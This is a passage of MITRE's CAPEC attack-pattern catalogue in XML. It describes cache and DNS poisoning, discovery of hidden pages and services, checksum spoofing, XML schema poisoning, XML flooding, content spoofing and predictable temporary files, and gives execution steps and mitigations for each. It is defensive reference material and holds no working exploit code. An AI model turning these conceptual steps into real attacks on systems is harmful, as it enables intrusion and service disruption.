         <Description>Some web applications require users to submit information through an ordered sequence of web forms. This is often done if there is a very large amount of information being collected or if information on earlier forms is used to pre-populate fields or determine which additional information the application needs to collect. An attacker who knows the names of the various forms in the sequence may be able to explicitly type in the name of a later form and navigate to it without first going through the previous forms. This can result in incomplete collection of information, incorrect assumptions about the information submitted by the attacker, or other problems that can impair the functioning of the application.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="74"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target must collect information from the user in a series of forms where each form has its own URL that the attacker can anticipate and the application must fail to detect attempts to access intermediate forms without first filling out the previous forms.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="372"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="141" Name="Cache Poisoning" Abstraction="Standard" Status="Draft">
         <Description>An attacker exploits the functionality of cache technologies to cause specific data to be cached that aids the attackers' objectives. This describes any attack whereby an attacker places incorrect or harmful material in cache. The targeted cache can be an application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache). Until the cache is refreshed, most applications or clients will treat the corrupted cache value as valid. This can lead to a wide range of exploits including redirecting web browsers towards sites that install malware and repeatedly incorrect calculations based on the incorrect value.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="161"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Identify and explore caches] Use tools to sniff traffic and scan a network in order to locate application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache) that may have vulnerabilities. Look for poisoning point in cache table entries.</Description>
               <Technique>Run tools that check available entries in the cache.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Cause specific data to be cached] An attacker sends bogus request to the target, and then floods responses that trick a cache to remember malicious responses, which are wrong answers of queries.</Description>
               <Technique>Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Redirect users to malicious website] As the attacker succeeds in exploiting the vulnerability, he is able to manipulate and interpose malicious response data to targeted victim queries.</Description>
               <Technique>Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).</Technique>
               <Technique>Man-in-the-Middle intercepts secure communication between two parties.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The attacker must be able to modify the value stored in a cache to match a desired value.</Prerequisite>
            <Prerequisite>The targeted application must not be able to detect the illicit modification of the cache and must trust the cache value in its calculations.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">To overwrite/modify targeted cache</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>Configuration: Disable client side caching.</Mitigation>
            <Mitigation>Implementation: Listens for query replies on a network, and sends a notification via email when an entry changes.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">DNS cache poisoning example</xhtml:div>
               <xhtml:p>In this example, an attacker sends request to a local DNS server to look up www.example .com. The associated IP address of www.example.com is 1.3.5.7.</xhtml:p>
               <xhtml:p>Local DNS usually caches IP addresses and do not go to remote DNS every time. Since the local record is not found, DNS server tries to connect to remote DNS for queries. However, before the remote DNS returns the right IP address 1.3.5.7, the attacker floods local DNS with crafted responses with IP address 2.4.6.8. The result is that 2.4.6.8 is stored in DNS cache. Meanwhile, 2.4.6.8 is associated with a malicious website www.maliciousexampsle.com</xhtml:p>
               <xhtml:p>When users connect to www.example.com, the local DNS will direct it to www.maliciousexample.com, this works as part of a Pharming attack.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="348"/>
            <Related_Weakness CWE_ID="345"/>
            <Related_Weakness CWE_ID="349"/>
            <Related_Weakness CWE_ID="346"/>
            <Related_Weakness CWE_ID="441"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-22" Section="DNS Cache Poisoning"/>
            <Reference External_Reference_ID="REF-23" Section="DNS Threats &amp; Weaknesses of the Domain Name System"/>
            <Reference External_Reference_ID="REF-24" Section="Arp Spoofing"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="142" Name="DNS Cache Poisoning" Abstraction="Detailed" Status="Draft">
         <Description>A domain name server translates a domain name (such as www.example.com) into an IP address that Internet hosts use to contact Internet resources. An adversary modifies a public DNS cache to cause certain names to resolve to incorrect addresses that the adversary specifies. The result is that client applications that rely upon the targeted cache for domain name resolution will be directed not to the actual address of the specified domain name but to some other address. Adversaries can use this to herd clients to sites that install malware on the victim's computer or to masquerade as part of a Pharming attack.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="141"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="89"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Explore resolver caches] Check DNS caches on local DNS server and client's browser with DNS cache enabled.</Description>
               <Technique>Run tools that check the resolver cache in the memory to see if it contains a target DNS entry.</Technique>
               <Technique>Figure out if the client's browser has DNS cache enabled.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Attempt sending crafted records to DNS cache] A request is sent to the authoritative server for target website and wait for the iterative name resolver. An adversary sends bogus request to the DNS local server, and then floods responses that trick a DNS cache to remember malicious responses, which are wrong answers of DNS query.</Description>
               <Technique>Adversary must know the transaction ID by intercepting a DNS query, or sending a bogus query with known transaction ID.</Technique>
               <Technique>If the transaction ID used to identify each query instance is randomized in some new DNS software, the attack must guess the transaction ID. Slow the response of the real DNS server by causing Denial-of-service. This gives adversaries enough time to guess transaction</Technique>
               <Technique>Adversary crafts DNS response with the same transaction ID as in the request. The adversary sends out DNS responses before the authorized DNS server. This forces DNS local cache stores fake DNS response (wrong answer). The fake DNS responses usually include a malicious website's IP address.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Redirect users to malicious website] As the adversary succeeds in exploiting the vulnerability, the victim connects to a malicious site using a good web site's domain name.</Description>
               <Technique>Redirecting Web traffic to a site that looks enough like the original so as to not raise any suspicion.</Technique>
               <Technique>Man-in-the-Middle intercepts secure communication between two parties.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>A DNS cache must be vulnerable to some attack that allows the adversary to replace addresses in its lookup table.Client applications must trust the corrupted cashed values and utilize them for their domain name resolutions.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">To overwrite/modify targeted DNS cache</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The adversary must have the resources to modify the targeted cache. In addition, in most cases the adversary will wish to host the sites to which users will be redirected, although in some cases redirecting to a third party site will accomplish the adversary's goals.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Configuration: Make sure your DNS servers have been updated to the latest versions</Mitigation>
            <Mitigation>Configuration: UNIX services like rlogin, rsh/rcp, xhost, and nfs are all susceptible to wrong information being held in a cache. Care should be taken with these services so they do not rely upon DNS caches that have been exposed to the Internet.</Mitigation>
            <Mitigation>Configuration: Disable client side DNS caching.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>In this example, an adversary sends request to a local DNS server to look up www.example .com. The associated IP address of www.example.com is 1.3.5.7.</xhtml:p>
               <xhtml:p>Local DNS usually caches IP addresses and do not go to remote DNS every time. Since the local record is not found, DNS server tries to connect to remote DNS for queries. However, before the remote DNS returns the right IP address 1.3.5.7, the adversary floods local DNS with crafted responses with IP address 2.4.6.8. The result is that 2.4.6.8 is stored in DNS cache. Meanwhile, 2.4.6.8 is associated with a malicious website www.maliciousexampsle.com</xhtml:p>
               <xhtml:p>When users connect to www.example.com, the local DNS will direct it to www.maliciousexample.com, this works as part of a Pharming attack.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="348"/>
            <Related_Weakness CWE_ID="345"/>
            <Related_Weakness CWE_ID="349"/>
            <Related_Weakness CWE_ID="346"/>
            <Related_Weakness CWE_ID="441"/>
            <Related_Weakness CWE_ID="350"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-22" Section="DNS Cache Poisoning"/>
            <Reference External_Reference_ID="REF-23" Section="DNS Threats &amp; Weaknesses of the Domain Name System"/>
            <Reference External_Reference_ID="REF-27"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Payload_Activation_Impact, Related_Vulnerabilities, Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="143" Name="Detect Unpublicized Web Pages" Abstraction="Detailed" Status="Draft">
         <Description>An attacker searches a targeted web site for web pages that have not been publicized. Generally this involves mapping the published web site by spidering through all the published links and then attempt to access well-known debugging or logging pages, or otherwise predictable pages within the site tree. For example, if an attacker might be able to notice a pattern in the naming of documents and extrapolate this pattern to discover additional documents that have been created but are no longer externally linked. Using this, the attacker may be able to gain access to information that the targeted site did not intend to make public.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="150"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted web site must include pages within its published tree that are not connected to its tree of links. The sensitivity of the content of these pages determines the severity of this attack.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Spidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common page locations from known paths.</Resource>
         </Resources_Required>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="144" Name="Detect Unpublicized Web Services" Abstraction="Detailed" Status="Draft">
         <Description>An attacker searches a targeted web site for web services that have not been publicized. Generally this involves mapping the published web site by spidering through all the published links and then attempt to access well-known debugging or logging services, or otherwise predictable services within the site tree. This attack can be especially dangerous since unpublished but available services may not have adequate security controls placed upon them given that an administrator may believe they are unreachable.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="150"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted web site must include unpublished services within its web tree. The nature of these services determines the severity of this attack.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Spidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common service queries from known paths.</Resource>
         </Resources_Required>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="145" Name="Checksum Spoofing" Abstraction="Detailed" Status="Draft">
         <Description>An adversary spoofs a checksum message for the purpose of making a payload appear to have a valid corresponding checksum. Checksums are used to verify message integrity. They consist of some value based on the value of the message they are protecting. Hash codes are a common checksum mechanism. Both the sender and recipient are able to compute the checksum based on the contents of the message. If the message contents change between the sender and recipient, the sender and recipient will compute different checksum values. Since the sender's checksum value is transmitted with the message, the recipient would know that a modification occurred. In checksum spoofing an adversary modifies the message body and then modifies the corresponding checksum so that the recipient's checksum calculation will match the checksum (created by the adversary) in the message. This would prevent the recipient from realizing that a change occurred.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="148">
               <Exclude_Related Exclude_ID="512"/>
               <Exclude_Related Exclude_ID="515"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must be able to intercept a message from the sender (keeping the recipient from getting it), modify it, and send the modified message to the recipient.</Prerequisite>
            <Prerequisite>The sender and recipient must use a checksum to protect the integrity of their message and transmit this checksum in a manner where the adversary can intercept and modify it.</Prerequisite>
            <Prerequisite>The checksum value must be computable using information known to the adversary. A cryptographic checksum, which uses a key known only to the sender and recipient, would thwart this attack.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The adversary must have a utility that can intercept and modify messages between the sender and recipient.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="354"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="146" Name="XML Schema Poisoning" Abstraction="Detailed" Status="Stable">
         <Description>An adversary corrupts or modifies the content of XML schema information passed between a client and server for the purpose of undermining the security of the target. XML Schemas provide the structure and content definitions for XML documents. Schema poisoning is the ability to manipulate a schema either by replacing or modifying it to compromise the programs that process documents that use this schema. Possible attacks are denial of service attacks by modifying the schema so that it does not contain required information for subsequent processing. For example, the unaltered schema may require a @name attribute in all submitted documents. If the adversary removes this attribute from the schema then documents created using the new grammar may lack this field, which may cause the processing application to enter an unexpected state or record incomplete data. In addition, manipulation of the data types described in the schema may affect the results of calculations taken by the document reader. For example, a float field could be changed to an int field. Finally, the adversary may change the encoding defined in the schema for certain fields allowing the contents to bypass filters that scan for dangerous strings. For example, the modified schema might us a URL encoding instead of ASCII, and a filter that catches a semicolon (;) might fail to detect its URL encoding (%3B).</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="271"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Some level of access to modify the target schema.</Prerequisite>
            <Prerequisite>The schema used by the target application must be improperly secured against unauthorized modification and manipulation.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Access to the schema and the knowledge and ability modify it. Ability to replace or redirect access to the modified schema.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
               <Impact>Resource Consumption</Impact>
               <Note>A successful schema poisoning attack can compromise the availability of the target system's service by exhausting its available resources.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Protect the schema against unauthorized modification.</Mitigation>
            <Mitigation>Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the XML document. Additionally, ensure that the proper permissions are set on local files to avoid unauthorized modification.</Mitigation>
            <Mitigation>Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>XML Schema Poisoning Attacks can often occur locally due to being embedded within the XML document itself or being located on the host within an improperaly protected file. In these cases, the adversary can simply edit the XML schema without the need for additional privileges. An example of the former can be seen below:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">&lt;?xml version="1.0"?&gt; &lt;!DOCTYPE contact [ &lt;!ELEMENT contact (name,phone,email,address)&gt; &lt;!ELEMENT name (#PCDATA)&gt; &lt;!ELEMENT phone (#PCDATA)&gt; &lt;!ELEMENT email (#PCDATA)&gt; &lt;!ELEMENT address (#PCDATA)&gt; ]&gt; &lt;note&gt; &lt;name&gt;John Smith&lt;/name&gt; &lt;phone&gt;555-1234&lt;/phone&gt; &lt;email&gt;jsmith@email.com&lt;/email&gt; &lt;address&gt;1 Example Lane&lt;/address&gt; &lt;/note&gt;&lt;/capec:Code&gt;</xhtml:div>
               <xhtml:p>If the 'name' attribute is required in all submitted documents and this field is removed by the adversary, the application may enter an unexpected state or record incomplete data. Additionally, if this data is needed to perform additional functions, a Denial of Service (DOS) may occur.</xhtml:p>
            </Example>
            <Example>
               <xhtml:p>XML Schema Poisoning Attacks can also be executed remotely if the HTTP protocol is being used to transport data. :</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">&lt;?xml version="1.0"?&gt; &lt;!DOCTYPE contact SYSTEM "http://example.com/contact.dtd"[ &lt;note&gt; &lt;name&gt;John Smith&lt;/name&gt; &lt;phone&gt;555-1234&lt;/phone&gt; &lt;email&gt;jsmith@email.com&lt;/email&gt; &lt;address&gt;1 Example Lane&lt;/address&gt; &lt;/note&gt;&lt;/capec:Code&gt;</xhtml:div>
               <xhtml:p>The HTTP protocol does not encrypt the traffic it transports, so all communication occurs in plaintext. This traffic can be observed and modified by the adversary during transit to alter the XML schema before it reaches the end user. The adversary can perform a Man-in-the-Middle (MITM) Attack to alter the schema in the same way as the previous example and to acheive the same results.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="15"/>
            <Related_Weakness CWE_ID="472"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="147" Name="XML Ping of the Death" Abstraction="Detailed" Status="Draft">
         <Description>An attacker initiates a resource depletion attack where a large number of small XML messages are delivered at a sufficiently rapid rate to cause a denial of service or crash of the target. Transactions such as repetitive SOAP transactions can deplete resources faster than a simple flooding attack because of the additional resources used by the SOAP protocol and the resources necessary to process SOAP messages. The transactions used are immaterial as long as they cause resource utilization on the target. In other words, this is a normal flooding attack augmented by using messages that will require extra processing on the target.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="528"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the target] Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.</Description>
               <Technique>Use an automated tool to record all instances of URLs to process XML requests.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how the application processes XML requests.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>[Launch a resource depletion attack] The attacker delivers a large number of small XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.</Description>
               <Technique>Send a large number of crafted small XML messages to the target URL.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target must receive and process XML transactions.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To send small XML messages</Skill>
            <Skill Level="High">To use distributed network to launch the attack</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Transaction generator(s)/source(s) and ability to cause arrival of messages at the target with sufficient rapidity to overload target. Larger targets may be able to handle large volumes of requests so the attacker may require significant resources (such as a distributed network) to affect the target. However, the resources required of the attacker would be less than in the case of a simple flooding attack against the same target.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>DoS: resource consumption (other)</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval.</Mitigation>
            <Mitigation>Implementation: Provide for network flow control and traffic shaping to control access to the resources.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="400"/>
            <Related_Weakness CWE_ID="770"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Solutions_and_Mitigations</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="148" Name="Content Spoofing" Abstraction="Meta" Status="Stable">
         <Description>An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target must provide content but fail to adequately protect it against modification.The adversary must have the means to alter data to which he/she is not authorized.If the content is to be modified in transit, the adversary must be able to intercept the targeted messages.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>
               <xhtml:p>If the content is to be modified in transit, the adversary requires a tool capable of intercepting the target's communication and generating/creating custom packets to impact the communications.</xhtml:p>
               <xhtml:p>In some variants, the targeted content is altered so that all or some of it is redirected towards content published by the attacker (for example, images and frames in the target's web site might be modified to be loaded from a source controlled by the attacker). In these cases, the attacker requires the necessary resources to host the replacement content.</xhtml:p>
            </Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
               <Note>A successful content spoofing attack compromises the integrity of the application data.</Note>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="345"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="149" Name="Explore for Predictable Temporary File Names" Abstraction="Detailed" Status="Draft">
         <Description>An attacker explores a target to identify the names and locations of predictable temporary files for the purpose of launching further attacks against the target. This involves analyzing naming conventions and storage locations of the temporary files created by a target application. If an attacker can predict the names of temporary files they can use this information to mount other attacks, such as information gathering and symlink attacks.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="169">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted application must create names for temporary files using a predictable procedure, e.g. using sequentially increasing numbers.</Prerequisite>
            <Prerequisite>The attacker must be able to see the names of the files the target is creating.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
